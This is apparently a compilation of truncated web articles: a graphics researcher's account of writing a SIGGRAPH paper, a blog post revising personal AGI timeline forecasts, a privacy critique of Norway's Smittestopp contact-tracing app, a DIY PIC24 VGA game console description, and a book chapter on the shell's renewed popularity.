<p><a href="https://www.mattkeeter.com/projects/siggraph/notebook.jpg"><img src="https://www.mattkeeter.com/projects/siggraph/oct11.jpg" alt="Notebook"></a></p>
<p>The fascinating part, looking back, is how <em>close</em> this turned out to be –
it's not exactly what I ended up implementing and writing up,
but it's about 90% of the way there.</p>
<p>I started development on October 14th.
Out of the gate, I decided to use <a href="https://en.wikipedia.org/wiki/CUDA">CUDA</a> for GPU acceleration:
I've got an Macbook Pro from the NVIDIA days, so CUDA runs on it,
and I didn't want to make my life harder than necessary.
This would prove to be a good decision,
because I'd later use the same code to benchmark on
more powerful Linux workstations.</p>
<p>(As a side note, I have no idea what I'll do when this laptop dies –
I like Apple's hardware and software,
but also like being able to do cross-platform development)</p>
<p>The project started as a purely 2D renderer.
Like most GPU projects,
it had particularly aesthetic glitches:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/glitches.png" alt="glitches"><br>
(October 26-29)</p>
<p>By mid-November,
the core 2D algorithm was working,
and I began implementing a demo GUI.
This was motivated in part by an upcoming visit to
my <a href="http://cba.mit.edu/">old research group</a>:
I wanted to show them what I was working on and get their feedback.</p>
<p>By November 17th, the GUI looked like this:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/nov17.png" alt="2D GUI"></p>
<p>This reuses the <a href="http://libfive.com/studio/">Scheme bindings and standard library from <code>libfive</code></a>
which was a huge time saver.</p>
<p>The visit to CBA went well.
I had already convinced myself that I need 3D rendering
to make this a good paper, and they agreed.
Neil also suggested benchmarking against a brute-force renderer,
which led to Figure 5 in the final paper.</p>
<p>By November 27th, I had implemented 3D rendering:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/nov27.png" alt="3D GUI"></p>
<p>At this point, I switched gears and started working on the paper itself.</p>
<h3>December (2019) - January (2020): Writing the paper</h3>
<p>The first commit in the paper repository is dated to December 1st.</p>
<p>There's a fair amount of infrastructure involved in writing a technical paper.</p>
<ul>
<li>LaTeX (which I already knew)</li>
<li>The <code>acmart</code> document class</li>
<li>Using BibTex to track sources</li>
<li>Writing a <code>Makefile</code> to compile the paper</li>
</ul>
<p>None of this is <em>hard</em>,
but it's time-consuming to learn and set up.
<a href="https://cs.dartmouth.edu/%7Ewjarosz/writing.html">This page</a>
is a great (if somewhat overwhelming) list of things to keep in mind when
writing a technical paper.
<a href="https://www.siggraph.org/sites/default/files/kajiya.pdf">How to Get Your SIGGRAPH Paper Rejected</a>
is another good reference, as is
<a href="https://graphics.stanford.edu/%7Ekayvonf/notes/systemspaper/">What Makes a (Graphics) Systems Paper Beautiful</a>.</p>
<p>I also leaned heavily on reading past papers, not just for content,
but for form.  <a href="https://www.cs.toronto.edu/%7Ejacobson/">Alec Jacobson's research group</a>
has published consistently strong SIGGRAPH papers,
and I often referred to the
<a href="https://www.cs.toronto.edu/%7Ejacobson/images/tetrahedral-meshing-in-the-wild-siggraph-2018-hu-et-al.pdf">TetWild paper</a>
(PDF)
when I had questions of style.</p>
<p>I traditionally visit family over Thanksgiving,
then stay in Boston over Christmas break for some downtime.
This year, writing the paper was my major project.
It's hard to say exactly how much time went into the writing of the paper,
but I spent a hour or two each evening working on it.</p>
<h4>Citing previous work</h4>
<p>I was extremely nervous about this section of the <a href="https://s2020.siggraph.org/submissions/technical-papers-submissions/">Technical Papers guidelines</a>:</p>
<blockquote>
<p>...a paper may also be rejected [before review] if it solves a problem that is known to be already solved;
does not cite (and the authors seem unaware of) important prior work on
the same problem and doesn't address how it is different;...</p>
</blockquote>
<p>This nervousness led to me spending a lot of time reviewing previous papers,
then tracking down their sources,
and so on.
I didn't read every word of every cited paper,
but I certainly looked at a <em>lot</em> of prior research,
both for inspiration and to compare against in the "Prior Work" section of the paper.</p>
<p>(Even then,
I got called out by the primary reviewer for citing "obscure" references
instead of more standard ones)</p>
<h4>Finding interesting demo models</h4>
<p>In the mesh world, there's a
<a href="https://en.wikipedia.org/wiki/List_of_common_3D_test_models">long list of common models</a>.
Sadly, there's no equivalent for implicit surfaces,
and despite my enthusiasm for 3D graphics, I'm a terrible 3D artist.</p>
<p>I tackled this from several angles.
First, I made a relatively straight-forward copy of the
<a href="https://en.wikipedia.org/wiki/Bethesda_Terrace_and_Fountain">Bethesda Terrace and Fountain</a>:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/bridge.png" alt="Terrace bridge"></p>
<p>(based on a previous design by my wife)</p>
<p>Second, I reached out to <a href="http://raven.works/">Hazel</a>,
who has contributed to <a href="https://libfive.com/studio">Studio</a> in the past;
she graciously shared a bear head sculpture to use as an example in the paper:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/bear.png" alt="Bear"></p>
<p>This model is a <em>particularly challenging</em> benchmark for my algorithm,
because it's built of smooth operations which can't be culled,
unlike hard-surface CSG modeling.</p>
<p>Finally, I dug up an involute gear model that has followed me around
<a href="https://www.mattkeeter.com/projects/kokopelli/">since 2013</a>,
which is an interesting middle ground:
it's primarily CSG, but uses expensive trigonometric functions.</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/gears.png" alt="Gears"></p>
<p>Of course,
the pattern of the three gears is a tribute to the venerable
<a href="https://www.x.org/archive/X11R7.0/doc/html/glxgears.1.html"><code>glxgears</code></a>.</p>
<h4>Making pictures pretty</h4>
<p>In early December,
I made a second visit to CBA to show off 3D rendering.
The main advice from this visit was that I needed
snazzy demo pictures.
In light of this feedback,
I implemented two new features:</p>
<ul>
<li>Rendering with perspective</li>
<li>Screen-space ambient occlusion</li>
</ul>
<h4>Benchmarking</h4>
<p>Since this was a systems paper,
I wanted to present benchmarking results to examine performance and scaling.
More importantly, the whole point of this research is to render things <em>fast</em>,
and my 2013 Macbook wasn't powerful enough to
claim "interactive framerates" with a straight face.</p>
<p><a href="https://galese.net/">Martin Galese</a> – a long-time friend –
founded <a href="https://patentmark.ai/">Patentmark</a>,
a startup which uses machine learning to improve the patent review process.
As part of this work,
he's got a hefty VR/ML workstation in his basement
to train ML models.
He was kind enough to give me an account on the machine,
so I could SSH in and run benchmarks on a relatively recent GPU.</p>
<p>This machine has a flagship 2017 GPU
(<a href="https://www.nvidia.com/en-sg/geforce/products/10series/geforce-gtx-1080-ti/">NVIDIA GTX 1080 Ti</a>)
but I was left wondering whether I could get access to anything bigger.</p>
<p>As it turns out, AWS will give you a
<a href="https://www.nvidia.com/en-us/data-center/v100/">Tesla V100</a>
for a mere $3.06/hour.
This is a truly absurd GPU,
intended for …</p></div></div>

August 25, 2020 | https://www.alexirpan.com/2020/08/18/ai-timelines.html | <a href="https://web.archive.org/web/*/https://www.alexirpan.com/2020/08/18/ai-timelines.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>For this post, I’m going to take artificial general intelligence (AGI) to mean
an AI system that matches or exceeds humans at almost all (95%+)
economically valuable work. I prefer this definition because it focuses on what
causes the most societal change, rather than how we get there.</p>

<p>In 2015, I made the following forecasts about when AGI could happen.</p>

<ul>
  <li>10% chance by 2045</li>
  <li>50% chance by 2050</li>
  <li>90% chance by 2070</li>
</ul>

<p>Now that it’s 2020, I’m updating my forecast to:</p>

<ul>
  <li>10% chance by 2035</li>
  <li>50% chance by 2045</li>
  <li>90% chance by 2070</li>
</ul>

<p>I’m keeping the 90% line the same, but shifting everything else to
be faster. Now, if you’re looking for an argument of why I picked these particular
years, and why I shifted by 10 years instead of 5 or 15, you’re going to be
disappointed. Both are driven by a gut feeling.
What’s important is why parts of my thinking have changed - you can choose
your own timeline adjustment based on that.</p>

<p>Let’s start with the easy part first.</p>

<h2 id="i-should-have-been-more-uncertain">I Should Have Been More Uncertain</h2>

<p>It would be incredibly weird if I was never surprised by machine learning (ML)
research.
Historically, it’s very hard to predict the trajectory a research field will
take, and if I were never surprised, I’d take that as a personal failing to
not consider large enough ideas.</p>

<p>At the same time, when I think back on the past 5 years, I believe I was
surprised more often than average. It wasn’t all in a positive direction.
Unsupervised learning got better way faster than I expected. Deep reinforcement
learning got better
a little faster than I expected. Transfer learning has been slower than
expected. Combined, I’ve decided I should widen the distribution of outcomes,
so now I’m allocating 35 years to the 10%-90% interval instead of 25 years.</p>

<p>I also noticed that my 2015 prediction placed 10% to 50% in a 5 year range,
and 50% to 90% in a 20 year range. AGI is a long-tailed event, and there’s
a real possibility it’s never viable, but a 5-20 split is absurdly skewed.
I’m adjusting accordingly.</p>

<p>Now we’re at the hard part. Why did I choose to shift the 10% and 50% lines
closer to present day?</p>



<p>Three years ago, I was talking to someone who mentioned
that <a href="https://intelligence.org/2017/10/13/fire-alarm/">there was no fire alarm for AGI</a>.
I told them I knew Eliezer Yudkowsky had written another post about AGI, and
I’d seen it shared among Facebook friends, but I hadn’t gotten around to reading it.
They summarized it as, “It will never be obvious when AGI is going to occur.
Even a few years before it happens, it will be possible to argue AGI is far
away. By the time it’s common knowledge that AI safety is the most
important problem in the world, it’ll be too late.”</p>

<p>And my reaction was, “Okay, that matches what I’ve gotten from my Facebook
timeline. I already know the story of
Fermi predicting <a href="https://books.google.com/books?id=aSgFMMNQ6G4C&amp;pg=PA813&amp;lpg=PA813&amp;dq=weart+fermi&amp;source=bl&amp;ots=Jy1pBOUL10&amp;sig=c9wK_yLHbXZS_GFIv0K3bgpmE58&amp;hl=en&amp;sa=X&amp;ved=0ahUKEwjNofKsisnWAhXGlFQKHbOSB1QQ6AEIKTAA#v=onepage&amp;q=%22ten%20per%20cent%22&amp;f=false">a nuclear chain reaction was very likely
to be impossible</a>, only a few years before he worked on the
Manhattan Project. More recently, we had
<a href="https://www.wired.com/2014/05/the-world-of-computer-go/">Rémi Coulom state that superhuman Go was about 10 years away</a>,
one year before <a href="https://arxiv.org/abs/1412.6564">the first signs it could happen</a>,
and two years before <a href="https://en.wikipedia.org/wiki/AlphaGo_versus_Lee_Sedol">AlphaGo</a> made it official.
I <em>also</em> already know the <a href="https://en.wikipedia.org/wiki/Common_knowledge_(logic)">common knowledge</a>
arguments for AI safety.”
I decided it wasn’t worth my time to read it.</p>

<p>(If you haven’t heard the common knowledge arguments, here’s the quick
version: it’s possible for the majority to believe AI safety is
worthwhile, even if no one says so publicly, because each individual could be
afraid everyone else will call them crazy if they argue for drastic action. This can happen
even if literally everyone agrees, because they don’t know that everyone agrees.)</p>

<p>I read the post several years later out of boredom, and
I now need to retroactively complain to all my Facebook friends who only
shared the historical events and common knowledge arguments. Although
that post summary is <em>correct</em>, the ideas I found useful were all
<em>outside that summary</em>. I trusted you, filter bubble! How could you let me
down like this?</p>

<p>Part of the fire alarm post proposes hypotheses for why people claim AGI is
impossible. One of the hypotheses is that researchers pay too much attention
to the difficulty of getting something working with their current tools,
extrapolate that difficulty to the future, and conclude we could never create
AGI because the available tools aren’t good enough.
This is a bad argument, because your extrapolation needs to account for
research tools also improving over time.</p>

<p>What “tool” means is a bit fuzzy. One clear example is our coding libraries.
People used to write neural nets in Caffe, MATLAB, and Theano. Now it’s mostly
TensorFlow and PyTorch. A less obvious example is
feature engineering for computer vision. When was the
last time anyone talked about <a href="https://en.wikipedia.org/wiki/Scale-invariant_feature_transform">SIFT features</a> for computer vision? Ages ago,
they’re obsolete. But feature engineering didn’t disappear, it just turned into
<a href="https://en.wikipedia.org/wiki/Convolutional_neural_network">convolutional neural net</a> architecture tuning instead.
For a computer vision researcher, SIFT features were the old tool,
convolutional neural nets are the new tool, and computer vision is the application
that’s been supercharged by the better tool.</p>

<p>Whereas for me, I’m not a computer vision person. I think ML for control is a much
more interesting problem. However, you have to do computer vision to do control
in image-based environments, and if you want to handle the real world, image-based
inputs are the way to go. So for me, computer vision is the tool, robotics
is the application, and the improvements in computer vision have driven many
promising robot learning results.</p>

<p><img src="https://www.alexirpan.com/public/ai-timelines/filters.png" alt="AlexNet conv filters"></p>

<p>(Filters automatically learned by <a href="https://en.wikipedia.org/wiki/AlexNet">AlexNet</a>, which has
itself been obsoleted by the better tool, <a href="https://en.wikipedia.org/wiki/Residual_neural_network">ResNets</a>.)</p>

<p>I’m a big advocate for research tools. I think on average, people underestimate
their impact. So after reading the hypothesis that people don’t forecast
tool improvement properly, I thought for a bit, and decided I hadn’t properly
accounted for it either. That deserved shaving off a few years.</p>

<p>In the more empirical sides of ML, the obvious components of progress are your
ideas and computational budget, but there are less obvious ones too, like
your coding and debugging skills, and your ability to utilize your compute.
It doesn’t matter how many processors you have per machine, if your code doesn’t
use all the processors available.
There are a surprising number of ML applications where the main value-add
comes from better data management and data summarizing,
because those tools free up decision making time for everything else.</p>

<p>In general, everyone’s research tools are deficient in some way.
Research is
about doing something new, which naturally leads to discovering new problems,
and it’s highly unlikely someone’s already made the perfect tool for a problem
that didn’t exist three months ago. So, your current
research tools will <em>always</em> feel janky, and you shouldn’t be using that to
argue anything about timelines.</p>

<p>The research stack has lots of parts, improvements continually happen across that
entire stack, and most of
these improvements have multiplicative benefits. Multiplicative factors
can be very powerful.
One simple example is that to get 10x better results, you can either make one
thing 10x better with a paradigm shift, or you can make ten different
things
<a href="https://www.google.com/search?&amp;q=1.26^10">1.26x better</a>, and they’ll combine
to a 10x total improvement.
The latter is just as transformative, but can be much easier,
especially if you get 10 experts with different skill sets
to work together on a common goal. This is how corporations become a thing.</p>

<p>(From <a href="https://jamesclear.com/marginal-gains">JamesClear.com</a>)</p>

<h2 id="semi-supervised-and-unsupervised-learning-are-getting-better">Semi-Supervised and Unsupervised Learning are Getting Better</h2>

<p>Historically, unsupervised learning has been in this weird position where it is
obviously the right way to do learning, and also a complete waste of time if
you want something to work ASAP.</p>

<p>On the one hand, humans don’t have labels for most things they learn,
so ML systems shouldn’t need labels either. On the other hand, the
deep learning boom of 2015 was mostly powered by supervised learning on
large, labeled datasets.
Richard Socher made a notable tweet at the time:</p>

<div>
<blockquote><p lang="en" dir="ltr">Rather than spending a month figuring out an unsupervised machine learning problem, just label some data for a week and train a classifier.</p>— Richard Socher (@RichardSocher) <a href="https://twitter.com/RichardSocher/status/840333380130553856?ref_src=twsrc%5Etfw">March 10, 2017</a></blockquote> 
</div>

<p>I wouldn’t say unsupervised learning has always been useless. In 2010, it was
common wisdom that deep networks should go through an unsupervised pre-training
step before starting supervised learning. See <a href="https://jmlr.csail.mit.edu/papers/volume11/erhan10a/erhan10a.pdf">(Erhan et al, JMLR 2010)</a>.
In 2015, self-supervised word vectors like <a href="https://nlp.stanford.edu/projects/glove/">GloVe</a>
and <a href="https://en.wikipedia.org/wiki/Word2vec">word2vec</a> were automatically
learning interesting relationships between words.
As someone who started ML around 2015,
these unsupervised successes felt like exceptions to the rule. Most other
applications relied on labels. Pretrained ImageNet features
were the closest thing to general behavior, and those features were learned
from scratch through only supervised learning.</p>

<p>I’ve long agreed that unsupervised learning is the future, and the right way
to do things, as soon as we figure out how to do so.
But man, we have spent a long time trying to do so.
That’s made me
pretty impressed with the semi-supervised and unsupervised learning papers from
the past few months.
Momentum Contrast from <a href="https://arxiv.org/abs/1911.05722">(He et al, CVPR 2020)</a>
was quite nice, SimCLR from <a href="https://arxiv.org/abs/2002.05709">(Chen et al, ICML 2020)</a> improved
on that, and Bootstrap Your Own Latent <a href="https://arxiv.org/abs/2006.07733">(Grill, Strub, Altché, Tallec, Richemond et al, 2020)</a>
has improved on that. And then there’s <a href="https://arxiv.org/abs/2005.14165">GPT-3</a>,
but I’ll get to that later.</p>

<p>When I was thinking through what made ML hard, the trend lines were pointing to larger
models and larger labeled datasets. They’re still pointing that way now.
I concluded that future ML progress would be bottlenecked by labeling requirements.
Defining a 10x bigger model is easy. <em>Training</em> a 10x bigger model is harder, but
it doesn’t need 10x as many people to work on it. Getting 10x as many labels
does. Yes, data labeling tools are getting better, <a href="https://en.wikipedia.org/wiki/Amazon_Mechanical_Turk">Amazon Mechanical Turk</a> is very popular, and there are even
startups whose missions are to provide fast data labeling …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <p>We – the government appointed expert group – published our final public report last month (informally summarized by me in English <a href="https://www.eivindarvesen.com/blog/2020/05/20/smittestopp-summarized">here</a>) on the Norwegian COVID-19 app "Smittestopp", ascertaining whether security and privacy is responsibly taken care of.</p>
<p>In a group effort such as this one, there is often compromise –&nbsp;in order to be able to end up with a result everyone involved can justify to themselves, and stand by.</p>
<p><strong>We all agree on the conclusion in our report.</strong></p>
<p>There are, however – in <em>my</em> opinion – certain issues that are not addressed in the final report (and that might be out of scope for the report), that I think are imporant to consider. I will state some of these here, in addition to expanding on issues that appear in the report.</p>
<p><em>What I write here is my own professional opinion on security- and privacy aspects of the Norwegian COVID-19 contact tracing app, "Smittestopp". I do not (and can not) speak on behalf of any other persons, including any other members of the government appointed expert group. Nothing described herein is covered by NDA or legislation – everything is completely based on public information and what is described in our public report.</em></p>
<h2>Introduction and Context</h2>
<p>Comparatively, Norway was fairly early in rolling out an app, and the app itself is arguably one of the most invasive ones on the market – at least in a European context, where there are few (if any) other countries with the same configuration of privacy-impacting factors.</p>
<p>Smittestopp&nbsp;is a closed-source solution; requires registration and de facto identification of users; collects sensor data from multiple sources (both BLE and GPS); and uploads data from all users, all of the time, to a centralized storage – unless users pause collection, but even then "heartbeats" that contain information about BLE and GPS-activations in the app are sent in the background. </p>
<p>The degree to which (if any) there is data minimization in such a solution has been questioned by experts in public debate from the get-go.</p>
<p>Some of the design choices has been defended by involved parties in the media, as a prerequisite for attempting to both contact tracing <em>and</em> generating data for monitoring of public movement and other research and analysis purposes (including datasets for long term use).
One might then question the choice of attempting to solve both problems with one application, and what the privacy implications of this might be.</p>
<p>Any privacy engineer (and indeed many others with a modicum of technical or practical understanding) will quickly see that these design choices have practical consequences – and, in my assessment, huge privacy implications.</p>
<h2>Location data</h2>
<p><img src="https://www.eivindarvesen.com/content/blog/2020/06/27/location.jpg" alt="Man on a smartphone" title="Man on a smartphone"></p>
<p>What one is interested in when performing contact tracing is "who met whom". The identity of either party, or the location of contact is not relevant to prove contact.
You thus don't necessarily need to know <em>who</em> the involved parties are, or <em>where</em> the contact took place.</p>
<p>The argument made for the use of location data in the case of Smittestopp is to attempt to compensate for lack in data quality as a consequence of Bluetooth API limitations at the time: Bluetooth wouldn't work reliably in the backround on iOS, whereas Android might kill apps that continuously used Bluetooth or location services in the background.</p>
<p>On the other hand, GPS has a typical accuracy of 3 - 10 meters under ideal conditions (meaning outdoor usage).</p>
<p>A proper and transparent evaluation of the possibilities available here might then include:</p>
<ul>
<li>How big of a problem does the current API limitations pose in practice (i.e. "could we get by at all?")</li>
<li>If workarounds are needed, how do we evaluate alternatives (for instance, non-exhaustively):
<ul>
<li>Attempting to "live with" the current limitations</li>
<li>The Singaporean approach (in practice implementing a faux sleep-mode, necessitating keeping the app in foreground, but dimming screen when device is positioned "upside-down")</li>
<li>Collecting location data, which is Personally Identifiable Information (PII)</li>
</ul></li>
<li>How do the privacy implications of the respective alternatives size up against each other and the issue at hand?</li>
</ul>
<p>Though it has been claimed that this data is "anonymous" in several contexts, this is incorrect. By virtue of being personally identifiable information, location data cannot be anonymous by definition.
Location data can in itself reveal a person's identity. There is no such thing as "anonymous location data" on an individual basis. In aggregated datasets, one can have certain quantifiable guarantees about degree of privacy (e.g. via <a href="https://en.wikipedia.org/wiki/K-anonymity" target="_blank" rel="noopener noreferrer">k-anonymity</a>, <a href="https://en.wikipedia.org/wiki/Differential_privacy" target="_blank" rel="noopener noreferrer">differential privacy</a>), but this gets complicated very quickly for a variety of reasons, such as temporal correlations or re-identification by combining data sources.</p>
<p>In practice, location data is only a <em>clear</em> functional requirement (of sorts, not necessarily to this degree of accuracy) in the case of monitoring public movement or other research – the second purpose of the app.</p>
<h2>Centralized storage</h2>
<p>When we talk about centralized storage in the context of contact tracing apps, we usually mean systems that are based on collection that is uploaded to a central server, which holds all data. This is in contrast with decentralized systems, where every user's data is stored on their device – until it is needed. One should also note that most popular decentralized solutions are not <em>distributed</em>, i.e. they still use a central server as a communications channel of some sort (as opposed to purely peer-to-peer communications).</p>
<p>The argument made in favor of data centralization in the case of Smittestopp is that augmentation of user data with data from other users is needed in analysis. It is also a prerequisite for the purpose of looking at movement patterns (to evaluate government actions), or do further unspecified research on aggregated data – which is also a purpose of the same app.</p>
<p>A centralized datastore is in principle a defining factor when dealing with private data. Its very existence makes misuse, function creep, leakage and so on possible in a way that a decentralized solution just plainly doesn't –&nbsp;as you can't lose or abuse data you don't have.</p>
<p>Alternative sources to aggregated data may already exist, such as the data telco's already provide in aggregate form, and which has already been used for the same purposes in Norway. The upside in using this is reusing existing data (not collecting, storing, protecting the same data) and existing control mechanisms that protects security and privacy. The downside is that this data might not be as precise as location data collected directly from devices, as resolution would depend on a host of factors, including cell site density.</p>
<p>The privacy cost of uploading every user's locations and movements, as well as who they have met, and timestamps for all these events is undoubtably <em>much</em> larger than uploading what data is needed <em>when</em> needed, e.g. prompting users to upload their movements (or even just BLE-defined contacts) once a person they have been in contact with is positively diagnosed with COVID-19.</p>
<h2>Two purposes</h2>
<p>The current app is all-or-nothing, in that users can chose to have their data used for all the app's purposes, or to not use the app.</p>
<p>It is obviously not ideal to <em>not</em> let users explicitly opt in for either purpose. Nor is it in accordance with regular GDPR-demands (though we must remember that this is a major crisis), nor even best practice. A potential consequence of implementing one app that collects <em>a lot</em> of data (as a consequence of enabling two purposes), as well as not giving users a choice is that user uptake may be hampered.</p>
<h2>Data integrity and user traceability</h2>
<p>The use and communications of static device identifiers makes it possible to track or impersonate others, trace users in limited/partial leaks, and so on. Just about <em>every</em> other proposed solution (both protocol specifications, and existing apps) use "rolling" identifiers in one form or another. </p>
<p>Data was temporarily stored in an unencrypted database on user devices in previous versions of the app, which made it possible to inject or modify data before uploading it to the server.</p>
<p>The application connects to a cloud solution using an everlasting connection string, using no other session handling.</p>
<p>All of this means that data integrity cannot be guaranteed, at least in the parts of the dataset collected before fixes for some of these issue was released.</p>
<h2>Identifying users and analytics data</h2>
<p><img src="https://www.eivindarvesen.com/content/blog/2020/06/27/silhouette.jpg" alt="Silhouette of man" title="Silhouette of man"></p>
<p>In order to use the application, users have to register their phone number (de facto identifying themselves). Functionally, there is no need to identify any involved party. Even in contact tracing, users could be notified by the application when a contact has been diagnosed with COVID-19 by health authorities.
One could argue that registration is a mechanism that protects against bogus uploads to some extent – but this, in addition to protection of privacy, is in a sense built-in to decentralized approaches that demands human intervention before any upload takes place (e.g. distributing upload-codes, in the case of DP-3T) – many of which also lets users choose specificly what timespans to share.</p>
<p>Smittestopp was also found to be uploading analytics data (including potentially fingerprintable information) on just about any interaction the users do with the application –&nbsp;without telling users this (it was not stated in the privacy policy) or letting them choose whether they want to upload this data.</p>
<h2>Legal implications</h2>
<p><strong>Note:</strong> <em>I am not a lawyer. Read my reflections with this in mind.</em></p>
<p>The regulation that is the formal basis for processing of the data mentions that health- and location data collected for this purpose can not be shared with law enforcement, etc.
Bluetooth-data, however, is not mentioned. I interpret this as sharing of Bluetooth-data being permitted. This would mean that parties the data is shared with could be able to, for instance, build social graphs of the data subjects.
Though the regulation puts in place certain limitations …</p></section></div>

			<p>This 
			DIY project offers the
            simple stand-alone VGA game console which is based on <b> PIC24EP512GP202</b>  microcontroller.
            As the video signal and the corresponding sync signals are generated by software, 
			the console contains a
            minimum of hardware. There is also an audio signal output with five binary tone channels, mixed by 
			a 
			passive resistor network. Two of those channels are used for sound effects,  
			similar to ones used in video games of that time (early eighties) and 
			three for background music. This output is capable of driving line 
			output for PC speakers or headphones.</p>
			<p>
			It should be noted that there is no video processing unit, PGA or 
			any special purpose chips, and that PIC microcontrollers are not 
			designed for video signal generation. Everything is achieved by a 
			series of different design tricks and some compromises.</p>
			<p>
			This is an open hardware and open software project. Video 
			and audio generators, which are the vital parts of the firmware, are 
			the parts of the operating system, which will soon be documented, and can be used 
			for any other game or application. As the timings are critical, those parts 
			are written in assembly language, but all the other parts of the 
			program (scenario for some other games or any other application) may 
			also be written in some other programming language, preferably 
			Microchip's C. In this case all parts are written in Assembler, but 
			only as a result of author's preference.</p>
			<p>
			At the moment, only the game Jumping Jack is written for the 
			platform, well known to those who played with the Spectrum personal 
			computer back in the day. However, once a new game is created, it is 
			easy to download it from the computer, via 
			the serial port. The console has a USB connector, but it is used 
			only for 5V power supply. Unfortunately, microcontrollers which are 
			packed in DIP packages (with thru-hole soldering, convenient for DIY 
			projects and workshops) do not have USB interface but only serial ports, so 
			you have to use RS 232 to download the new game instead of Jumping 
			Jack, which is deafult in this project.</p>
			<p>
			If you want to build this console, you need the PCB and components 
			which are listed <span><strong>
			<a href="http://www.voja.rs/PROJECTS/GAME_HTM/2.%20Hardware.htm#BOM">here</a></strong></span>. 
			To program the microcontroller, you should need a PIC programmer (e.g. 
			<strong>PICKIT3</strong>, avaliable <span><strong>
			<a href="http://www.microchipdirect.com/ProductSearch.aspx?Keywords=PG164130">here</a></strong></span>) and
			<strong>MPLAB X IDE</strong> software, available <span><strong>
			<a href="http://www.microchip.com/pagehandler/en-us/family/mplabx/">here</a></strong></span>. 
			But if you want to know how PIC generates video and audio signals by 
			software in real time, or even if you feel ambitious enough to

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>This is the first of the “interludes” which end each section of the book. They don't teach any specific skills but instead give a little flavour and background about the world of the shell, Linux and modern computing.</p><p>In this first interlude we'll look at just why the shell is experiencing something of a renaissance in the modern age of IT.</p><p>To be honest, it is hard to know whether there is an increase in popularity of the use of the shell and command-line tooling in general. There are data sources which indicate there is more widespread usage amongst the technical community - Stack Overflow tag popularity is one. LinkedIn data on desired skillsets is another. However, disassociating whether there is a general increase in the need for diverse technical skillsets and whether there is a <em>specific</em> increase in the popularity of keyboard and script operated systems is a challenge.</p><p>For the purposes of this chapter, we'll instead examine changes in the technology landscape over the last few decades and consider what those changes might mean for the shell, the command-line and similar tools.</p><p>We'll look at three specific developments in technology:</p><ul><li>Diversity of programming languages</li><li>Convergence of operating platforms</li><li>DevOps</li></ul><p>Each of these developments has a potentially profound impact on how we work with computers, and might hint at the long term need for shell skills.</p><p>So let's look at some of the key changes in the technology landscape over recent years and consider how they might affect the popularity and importance of the shell.</p><h2 id="the-diversity-of-programming-languages">The Diversity of Programming Languages</h2><p>There have been many programming languages and platforms over the years. But in recent years it is possible that the diversity has increased at a greater rate than ever before.</p><p>With the advent of the internet and the increase in the size of the online technical community, programming has in a sense become more democratised (which we will discuss a little more in the ‘citizen coder’ section). When in the past it was necessary to find physical books or teachers and tutors to learn a programming language, students can now find a wealth of resources online.</p><p>It is perhaps this democratisation which has led to a startlingly diverse world of programming languages. For many years, there were a small number of ‘general purpose’ languages, and a larger number of highly specialised languages (and associated platforms).</p><p>“C”, and later, “C++” were the go-to languages for systems programming (sometimes backed up by assembly language). This was the language which kernels and compilers were written in.</p><p>“Java” become the ‘general purpose’ language of choice for applications which had to run on many systems. “Basic” and later “C#” were the standards for Windows platform development. PHP was a staple for web development.</p><p>Alongside these giants were the workhorses for specific use cases. Erlang was (and is) a language which is highly popular in the telecommunications industry, where high availability and reliability were paramount. COBOL was the language for the financial industry, where mission critical systems ran on mainframes (and many still do).</p><p>Of course there were many other languages, but many of these other languages were highly specific, in a sense C, Java, PHP and later C# dominated the landscape.</p><p>Transition to the time of writing. In the Stack Overflow 2020 Technology Survey[^1], the top ten languages most wanted by employers are:</p><ul><li>Python</li><li>JavaScript</li><li>Go</li><li>TypeScript</li><li>Rust</li><li>Kotlin</li><li>Java</li><li>C++</li><li>SQL</li><li>C#</li></ul><p>Some of our old friends are there, but there are many new languages, languages which are evolving quickly. Later on in the list we will see Swift, Dart, Ruby, Haskell, Scala. There are many programming languages which are extremely popular today.</p><p>Why does this matter for the shell? The answer is that for <em>many</em> new languages, developer tooling is not as mature (some might say bloated) as it is for the ‘Workhorse’ languages. Java developers are likely very familiar with the Eclipse IDE, Microsoft shops will be familiar with Visual Studio. These are products which have been evolving for years (or decades) to support developers with rich integrated development environments.</p><p>For server-side JavaScript, Golang, Rust, Python and other languages, the development environment really is the shell. Modern editors like Visual Studio Code, Atom and so on provide a vast amount of support and tooling, encompassing the features of a full fledged IDE if the user wants. But for modern programming languages, users often have <em>had</em> to rely on the shell to compile, transpile, manage packages, bundle and so on. The average developer today is perhaps much more likely to have to use the shell - to manage Python virtual environments one day, to run Node.js another, to install packages for Golang another.</p><p>In time tooling will likely catch up and provide a ‘friendly’ interface on top of these operations, but many engineers have realised (or always known) that direct access to simple command line tools can be <em>extremely efficient</em> when working, and that overly featured IDEs can get in the way and hide complexity.</p><p>The modern programming is often polyglot - having to be at least familiar in a number of languages. The shell provides a common environment and interface for tooling, which is accessible by all, without installing many complex components, for both development and runtime environments.</p><h2 id="convergence-of-operating-platforms">Convergence of Operating Platforms</h2><p>Whilst the variety in programming languages and developer tooling may have increased, in many ways the <em>operating platforms</em> engineers use have become more homogeneous.</p><p>In the early days of computing, each operating environment was highly diverse. There were many systems which were used for production and many of them were highly proprietary. Even popular application servers were often closed source and highly specialised.</p><p>The modern execution environment however is often fairly uniform. A Linux-like system, with few customisations, which the developer or operator can tweak to suit their needs.</p><p>More and more enterprise users have moved away from proprietary Unix platforms to Linux platforms (whether commercial or non-commercial). The earliest cloud environments were using open-source Linux distributions as the available operating systems.</p><p>Even Windows has increasing support for Linux-like operation, in the form of the Windows Subsystem for Linux.</p><p>Perhaps the greatest movement in this area has been the rapid adoption of Docker as a common container technology. Containers, or container-like systems have been around for a long time, but Docker brought containers to the masses. With Docker, engineers expect operating environments to be even more uniform and Linux-like.</p><p>This has made knowledge of the shell extremely valuable. For any containerised workloads, Linux and shell skills are crucial. Kubernetes (as an execution environment) has standardised things even more.</p><p>Whilst there are still many workloads which run on proprietary systems, modern solutions are often built to run in containers on Linux. The shell has historically been the most common way to manage Linux systems, and the standardisation of operating environments around Linux, or Linux-like systems has made shell skills even more 